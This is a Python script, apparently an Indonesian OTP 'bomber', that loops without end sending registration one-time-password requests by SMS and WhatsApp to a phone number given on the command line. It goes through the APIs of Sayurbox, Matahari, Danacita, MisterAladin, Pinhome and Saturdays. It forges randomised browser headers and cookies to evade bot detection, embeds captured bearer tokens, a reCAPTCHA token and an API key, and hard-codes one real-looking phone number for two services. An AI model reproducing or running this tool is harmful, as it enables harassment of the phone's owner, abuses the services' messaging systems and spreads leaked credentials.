import os, sys, time, json, requests
from colorama import Fore, init
from sys import argv
import random
import uuid

init(autoreset=True)

def autotype(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008)

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW

hijau = "\033[1;92m"
putih = "\033[1;97m"
biru = "\033[1;96m"
kuning = "\033[1;93m"

def generate_user_agent():
    browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
    os = ['Windows', 'Macintosh', 'Linux', 'Android', 'iOS']
    browser_version = random.randint(50, 90)
    os_version = random.randint(10, 15)
    return f"Mozilla/5.0 ({random.choice(os)} NT {os_version}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{browser_version}.0.4472.124 Safari/537.36"

def generate_accept_language():
    languages = ['en-US', 'id-ID', 'es-ES', 'zh-CN', 'ms-MY', 'ca-ES', 'pt-BR']
    random.shuffle(languages)
    return ','.join([f"{lang};q={round(random.uniform(0.1, 1.0), 1)}" for lang in languages])

def generate_cookie():
    return f"perf_dv6Tr4n={random.randint(1, 10)}; _gcl_au=1.1.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; amp_9bff24={uuid.uuid4()}...1i0tkmf66.1i0tkmf66.0.0.0; _gid=GA1.3.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; _gat_UA-106864485-1=1; _fbp=fb.2.{random.randint(1000000000, 1999999999)}.{random.randint(1000000000000, 1999999999999)}; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-20881%2C180.244.163.61%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CID; _ga_M6EGHSCWF7=GS1.1.{random.randint(1000000000, 1999999999)}.1.0.{random.randint(1000000000, 1999999999)}.57.0.0; ph_phc_3JD9yqRALGfavssFolNlgAlqrFJxXWoSMRypaScrcHv_posthog=%7B%22distinct_id%22%3A%22{uuid.uuid4()}%22%2C%22%24sesid%22%3A%5B{random.randint(1000000000, 1999999999)}%2C%22{uuid.uuid4()}%22%2C{random.randint(1000000000, 1999999999)}%5D%7D; _ga=GA1.1.{random.randint(1000000000, 1999999999)}; cebsp_=2; _ga_V9673QHFM5=GS1.1.{random.randint(1000000000, 1999999999)}.1.1.{random.randint(1000000000, 1999999999)}.38.0.0; _ce.s=v~26dae470825c19828984ea7d7dbfd066418b156c~lcw~{random.randint(1000000000, 1999999999)}~lva~{random.randint(1000000000, 1999999999)}~vpv~0~as~false~v11.fhb~{random.randint(1000000000, 1999999999)}~v11.lhb~{random.randint(1000000000, 1999999999)}~v11.cs~{random.randint(100000, 999999)}~v11.s~{uuid.uuid4()}~gtrk.la~lxotc4r2~v11.sla~{random.randint(1000000000, 1999999999)}~lcw~{random.randint(1000000000, 1999999999)}"

def generate_sec_ch_ua():
    brands = ['Not/A)Brand', 'Chromium', 'Google Chrome', 'Microsoft Edge', 'Safari']
    versions = [str(random.randint(70, 130)) for _ in range(3)]
    return f"\"{random.choice(brands)}\";v=\"{versions[0]}\", \"{random.choice(brands)}\";v=\"{versions[1]}\", \"{random.choice(brands)}\";v=\"{versions[2]}\""

def generate_sec_ch_ua_platform():
    platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
    return f"\"{random.choice(platforms)}\""

inputNomer = argv[1]
nomor_matahari = inputNomer.replace("+62", "0")
nomor_mraladin = inputNomer.replace("+62", "")
nomor_pinhome = inputNomer.replace("+62", "")
nomor_saturdays = inputNomer.replace("+62", "")
# Loop to send OTP requests
while True:
    user_agent = generate_user_agent()
    # Sayurbox
    headers_sayurbox = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzE5MDMzNDQ3LCJleHAiOjE3MjE2MjU0NDcsImlhdCI6MTcxOTAzMzQ0NywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjJkOWVlZGI0LTNmYjMtNDIzMi1hODFiLWY1NzljZDAyMzMwYiIsInN1YiI6ImFfcjB6RkF0cFRVa3NJUnlEWnlha1MxckQ2c3oiLCJ1c2VyX2lkIjoiYV9yMHpGQXRwVFVrc0lSeURaeWFrUzFyRDZzeiJ9.D5M7VAjb7mpyM2QsOpuBFWOXctqyMKUZLrhgZkm0CM-IuKe1GMMn8S9UJ3OOvLr3okl1KxQ87fH08mq8552Mx6MAq6Bgs_0KNDPqKxRc7Rqx7qLHIyBW20sKqbadIdOqmr7hKSGepkMUilx-MULvjFs1VMCRWUStqu8Zj-cohOSDIIaOBHZBJaAkrYSOZXVRq7gLsyeDJ9WWmovfsVWlLhyQmap7XztQmzq6AfcrI0R8NeK4SvH56fe9K-FC9KjYdVcJDC_O3VViWDqzCuJ5wHgTJwpGdpjC4jP-Eqp1iz-7bxXn9yx5OD6c2U2xB2wdNkgoOqKpixnVrSBzi15zAg",
        "Content-Type": "application/json",
        "Cookie": "perf_dv6Tr4n=1; _gcl_au=1.1.453795563.1718975654; _ga=GA1.1.1863538960.1718975654; _fbp=fb.1.1718975655048.519782181988016639; afUserId=ce18733b-0c78-451f-9579-c6300baa97db-p; AF_SYNC=1718975655764; _sbox_lang=id; __cnf=cnf0927; token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNzE5MDMzNDQ3LCJleHAiOjE3MjE2MjU0NDcsImlhdCI6MTcxOTAzMzQ0NywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGwsInRlbmFudCI6ImIyYyJ9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjJkOWVlZGI0LTNmYjMtNDIzMi1hODFiLWY1NzljZDAyMzMwYiIsInN1YiI6ImFfcjB6RkF0cFRVa3NJUnlEWnlha1MxckQ2c3oiLCJ1c2VyX2lkIjoiYV9yMHpGQXRwVFVrc0lSeURaeWFrUzFyRDZzeiJ9.D5M7VAjb7mpyM2QsOpuBFWOXctqyMKUZLrhgZkm0CM-IuKe1GMMn8S9UJ3OOvLr3okl1KxQ87fH08mq8552Mx6MAq6Bgs_0KNDPqKxRc7Rqx7qLHIyBW20sKqbadIdOqmr7hKSGepkMUilx-MULvjFs1VMCRWUStqu8Zj-cohOSDIIaOBHZBJaAkrYSOZXVRq7gLsyeDJ9WWmovfsVWlLhyQmap7XztQmzq6AfcrI0R8NeK4SvH56fe9K-FC9KjYdVcJDC_O3VViWDqzCuJ5wHgTJwpGdpjC4jP-Eqp1iz-7bxXn9yx5OD6c2U2xB2wdNkgoOqKpixnVrSBzi15zAg; localSessionId=lk0uc8P05F_9Iagy1q7kK:1719033426572; localSessionIdExpire=1719033426572; _ga_RG03K1J7BE=GS1.1.1719033426.2.0.1719033426.0.0.0; _ga_MHTN2YH4H8=GS1.1.1719033427.3.1.1719033901.60.0.0",
        "Origin": "https://www.sayurbox.com",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": user_agent,
        "X-Binary-Version": "2.21.2",
        "X-Bundle-Revision": "60.4",
        "X-Device-Info": "{\"platform\":\"web\",\"is_app\":false,\"is_mobile\":false,\"device_type\":\"desktop\",\"device_id\":\"lk0uc8P05F_9Iagy1q7kK\",\"os_name\":\"Windows\",\"os_version\":\"NT 10.0\",\"brand\":null,\"model\":null,\"pixel_density\":1.125,\"client_ip\":\"::ffff:10.10.202.18\"}",
        "X-Sbox-Lang": "id",
        "X-Sbox-Tenant": "b2c",
        "X-Supported-Delivery": "NEXTDAY,SAMEDAY,INSTANT"
    }
    def send_whatsapp_request(phone_number):
        data_whatsapp_sayurbox = json.dumps({
            "operationName": "generateOTP",
            "variables": {
                "destinationType": "whatsapp",
                "identity": phone_number
            },
            "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
        })
        response_danacita_whatsapp = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_whatsapp_sayurbox)
        if response_danacita_whatsapp.status_code == 200:
            result = response_danacita_whatsapp.json()
            print(f"{hijau}Berhasil mengirim Whatsapp via SayurBox {result}")
        else:
            print(f"{R}Gagal mengirim Whatsapp via SayurBox {response_danacita_whatsapp.status_code}: {response_danacita_whatsapp.text}")

# Function to send SMS request
    def send_sms_request(phone_number):
        data_sms_sayurbox = json.dumps({
            "operationName": "generateOTP",
            "variables": {
                "destinationType": "sms",
                "identity": phone_number
            },
            "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
        })
        response_danacita_sms = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_sms_sayurbox)
        if response_danacita_sms.status_code == 200:
            result = response_danacita_sms.json()
            print(f"{hijau}Berhasil mengirim SMS via SayurBox {result}")
        else:
            print(f"{R}Gagal mengirim SMS via SayurBox {response_danacita_sms.status_code}: {response_danacita_sms.status_code}")
        
    send_sms_request(inputNomer)
    send_whatsapp_request(inputNomer)
    # Matahari
    headers_matahari = {
        "Host": "www.matahari.com",
        "content-length": str(random.randint(20, 50)), 
        "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
        "sec-ch-ua-mobile": "?1",
        "user-agent": user_agent,
        "content-type": "application/json",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-platform": generate_sec_ch_ua_platform(),
        "origin": "https://www.matahari.com",
        "sec-fetch-site": random.choice(["same-site", "same-origin", "cross-site"]),
        "sec-fetch-mode": random.choice(["cors", "navigate", "no-cors"]),
        "sec-fetch-dest": random.choice(["empty", "document", "iframe"]),
        "referer": "https://www.matahari.com/customer/account/create/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": generate_accept_language()
    }
    data_matahari = json.dumps({
        "otp_request": {
            "mobile_number": nomor_matahari,
            "mobile_country_code": "+62",
            "token": "03AFcWeA6rBTK9XFGU4xi5A77pGBqHOhy74Vr6XW4ImA5P5nGi2rqtenZw7MwqMYv6ob_5aE4IjvAuFoboquHgpLHfAPwFGmVKEqBFJP31zKdlcQE95_AFEFpgrUmxNdboOADrHlHzJ98FePusoeEBP6GFedK-QoS7jjH6bygY38NdZ9mBlWqZzke13BN187QnP0kCiWDHPA5gspOHAA9N3zjxlsADcTqvabObXVZX6-2MjY_EZkZjNIc7B3LYQs5LTJHrFQOZKOKYeOO4EAXHBFGtUFzOVlAr7u2fp0obElm5PYyFKo71X_hlkM7zqG3ubwAy2RS8W5dUE5bHoaQ-8avw2Kozzykdcq8FMo0gIIIFEd7rM5wl689fAaUrohWNRwjONdeybL9YiapZ8oz81nXg6raaS7kYD07UQfjDv_xRw9XbpXwLxGLWoJDllawnbOm-TNKRREoy4qFZXQyh5k-xvMPWF2uReXsQlIZ7hlu_RjR8bSlc5WrA48nZDWS3A_K45nmUrihKw6FNG4WuaXEygNXv_gLl4GwloRKS1F_5SG6vKSYgXf2RqOrd_CO1f7T506fyvPtp9opDbZ9pjmHYdx583RvKrNVdnPYwu-qf69h53IKlpu7QlRH47RyAVJo0EExX9C9N4yRRQ8BSNCm8YAIpHgS8Yua21JeAvElQ6pV4nX_9aVjgwdcmU5sJKbAD9uvPUVk7ch5yqHmqQkPYeDoIMIre0ANhf6xqpd6PCVWmxqhEiHvMiK14E14inoxrjDpO7SSbimOCUJJGgAlZzp6XLOJLn1aJtyO34Cn4OWnm3UBKdHcBRUVAvQdRQ5NioV2yTv6hb2Qghc57_8rd4TDj8qniQuqWPPzzFnFkvdynEL1p9TVXJIuS0ZI20tIzGYqTZq4aissCsXXCsHzLBBVDkjdmZBRBbvR2Lv9jX6KavlBQ-X11dkBSPpYramyd24TglU4hiyYNipwmaw6lZlnTAxXkB3Av5ulh-Az39hG8fEOuoiQLnFRlpi_iH8nnooRqQNCsqyzRJ0SQ8cIsMcnsUDYvX9nzi5yccagMK6t-d5HL7353BCeFHSVWrKmcCJEEgacG3ka2-Aa9zj-MNJ6FAuioj0veQsqSpCw4Ug96bao3U3-M1VzG74NGrP9qul7kqhZ_A6htqiROsfgwSFYpviTTkGiqevRaKN3cuWlcPSdXqEyT72t-D07WHVzkmUJEtJ5sMUmYKPN2zCVog9manf757D1L0VC_bJnomu5_q9CEAW_g4b9dNnSCIiDWX4hw_ynMy1Qo37PYyb-1kkfQ9k2GTPGsdjc4bW53WdP4VkqbKuwdaIMCnSb8_hN-OyhUZJALXL0Hfc5gX_sC4d3aTKnrKp-Kp8u9_Gb4M0J7bDVPNiTEOO4v1iOtNJVD204DKhB0Ov3N5snWVLzAriErO48mAAU3la0xkeUEz53_CgCGCvZfDD8M8xV1uwsBkMvTcrv9smE4TLdB1u5q9kujmLfXOa9mIDlo2hxLbZsWjEwPWT4T23Ml7gecxrA6PEok3EAvJhyKm92bFZGLimRvXIc1TpTXMw4ZVpT_48ZBjCoN_W0joEL_AX0LDrp26X917_NtCyZyZiaYS05Qyd62oAK8oT0agNNs-HbjqgRMbYo_3RaxvDm2y3hn0zK2vfjoqECXncNSU5XDLjnvuf14KiCqaV4d3Y0znT_H_OgVeYo-usy25Nsw_ci58TWItD50VI9RZliM8FwtvglwMT36RFCCIdQzQcWsYGcYs-BQuDVYUDM"
        }
    })
    response_matahari = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", headers=headers_matahari, data=data_matahari)
    if response_matahari.status_code == 200:
        response_data = response_matahari.json()
        outcome_code = response_data.get("outcome_code")
        outcome_message = response_data.get("outcome_message")
        print(f"{hijau}Berhasil mengirim SMS/WA via Matahari {outcome_code}: {outcome_message}")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Matahari {response_matahari.status_code}: {response_matahari.text}")

    headers_danacita = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Content-Length": str(random.randint(20, 50)), 
        "Content-Type": "application/json",
        "Cookie": generate_cookie(),
        "Origin": "https://app.danacita.co.id",
        "Referer": "https://app.danacita.co.id/",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent()
	}
    
    data_danacita = json.dumps({
        "username": inputNomer,
	})
    
    
    response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
    if response_danacita.status_code == 200:
        response_data = response_danacita.json()
        detail = response_data.get("detail")
        print(f"{hijau}Berhasil mengirim SMS/WA via Danacita {detail}")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Danacita {response_danacita.status_code}: {response_danacita.text}")
        
    headers_misterAladin = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer null",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json;charset=UTF-8",
        "Cookie": "offer_id=103180; utm_source=involveasia; _ga=GA1.2.40616470.1718982768; _gid=GA1.2.1272049545.1718982768; Lda_aKUr6BGRn=everydaysi.com/r/v2?; G_ENABLED_IDPS=google; Ac_aqK8DtrDL=1; Fm_kZf8ZQvmX=1; __cfruid=de4c77417ef8c7b1aab81ffb4fceadf9762578dc-1719067746; click_id=710414e9316844668c613db0eb3e8f7f; utm_medium=1637-710414e9316844668c613db0eb3e8f7f; _gat=1; _ga_PLKRYTK7YG=GS1.2.1719067732.2.1.1719067735.57.0.0",
        "Origin": "https://www.misteraladin.com",
        "Priority": "u=1, i",
        "Referer": "https://www.misteraladin.com/register",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Platform": "web"
	}
    
    data_misterAladin = json.dumps({
        "phone_number_country_code": "62",
        "phone_number": nomor_mraladin,
        "type": "register"
	})
    
    response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin)
    if response_mraladin.status_code == 200:
        response_data = response_mraladin.json()
    
        data = response_data.get("data", {})
        print("ID:", data.get("id"))
        print("Member ID:", data.get("member_id"))
        print("Phone Number Country Code:", data.get("phone_number_country_code"))
        print("Phone Number:", data.get("phone_number"))
        print("Type:", data.get("type"))
        print("OTP Index:", data.get("otp_index"))
        print("Expired At:", data.get("expired_at"))
        print("Expire In Timestamp:", data.get("expire_in_timestamp"))
        print("Blocked End:", data.get("blocked_end"))
        print("Next Interval:", data.get("next_interval"))
        print("Created At:", data.get("created_at"))
        print("Updated At:", data.get("updated_at"))
        print(f"{hijau}Berhasil mengirim SMS/WA via Mister Aladin")
    else: 
        print(f"{R}Gagal mengirim SMS/WA via Mister Aladin {response_mraladin.status_code} {response_mraladin.text}")

    #pinhome
    headers_pinhome = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
        "Content-Length": str(random.randint(20, 50)),
        "Content-Type": "application/json",
        "Cookie": "_gcl_au=1.1.246269231.1718959212; _fbp=fb.1.1718959212234.210660632162219433; _gcl_au=1.1.246269231.1718959212; _ga=GA1.1.127919491.1718959212; _fbp=fb.1.1718959212234.210660632162219433; _ga_CYRVZ1HEXG=GS1.1.1718959211.1.0.1718959212.0.0.0; _hhcftd=1618a140204983c645ecd5c7e4f60381cdecf115; _clck=1iujwii%7C2%7Cfmv%7C0%7C1633; _clsk=hty05m%7C1719102661534%7C1%7C1%7Ch.clarity.ms%2Fcollect; ph_phc_vIu9D3s1qIMPGaAkpBsgyBhRUFKtuyS7qUqeo35W873_posthog=%7B%22distinct_id%22%3A%22019039f4-0639-73c4-bba9-8c71ae7a0b93%22%2C%22%24sesid%22%3A%5B1719102662482%2C%2201904280-df2e-7d49-b1ac-8ece3e8cb4fd%22%2C1719102660398%5D%7D; _gid=GA1.2.275863447.1719102663; _ga_Y1EHRSKVLJ=GS1.1.1719102663.1.0.1719102663.60.0.0; _ga=GA1.2.127919491.1718959212; _ga_CYRVZ1HEXG=GS1.1.1719102660.2.1.1719102667.0.0.0",
        "Origin": "https://www.pinhome.id",
        "Priority": "u=1, i",
        "Referer": "https://www.pinhome.id/daftar",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent(),
        "X-Auth": "Bearer 63cb746000e1f88adaede0b65928daecac1914832d5fb20538209a76ae1754ea"
    }
    
    data_pinhome = json.dumps({
        "accountType": "customers",
        "countryCode": "62",
        "medium": "whatsapp",
        "otpType": "register",
        "phoneNumber": "81281524356"
    })
    
    response_pinhome = requests.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome)
    if response_pinhome.status_code == 201:
        response_data = response_pinhome.json()
    
        print("Secret Code:", response_data.get("secretCode"))
        print(f"{hijau}Berhasil mengirim SMS/WA via Pinhome")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Pinhome {response_pinhome.status_code} {response_pinhome.text}")
        
        
    headers_saturdays = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en",
        "Authorization": "undefined", 
        "Connection": "keep-alive",
        "Content-Length": "55",
        "Content-Type": "application/json",
        "Country-Code": "ID",
        "Currency-Code": "IDR",
        "Device-Type": "dweb",
        "Host": "beta.api.saturdays.com",
        "Origin": "https://saturdays.com",
        "Platform": "dweb",
        "Referer": "https://saturdays.com/",
        "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "X-Api-Key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
    }

    data_saturdays = json.dumps({
        "number": "81281524356",
        "countryCode": "+62",
        "type": ""
    })
    
    response_saturdays = requests.post("https://beta.api.saturdays.com/api/v1/user/otp/send", headers=headers_saturdays, data=data_saturdays)
    if response_saturdays.status_code == 200:
        response_data = response_saturdays.json()
    
        print("Status:", response_data.get("status"))
        print("Data:", response_data.get("data"))
        print("Message (EN):", response_data.get("message").get("en"))
        print("Message (ID):", response_data.get("message").get("id"))
        print(f"{hijau}Berhasil mengirim SMS/WA via Saturdays")
    else:
        print(f"{R}Gagal mengirim SMS/WA via Saturdays {response_saturdays.status_code} {response_saturdays.text}")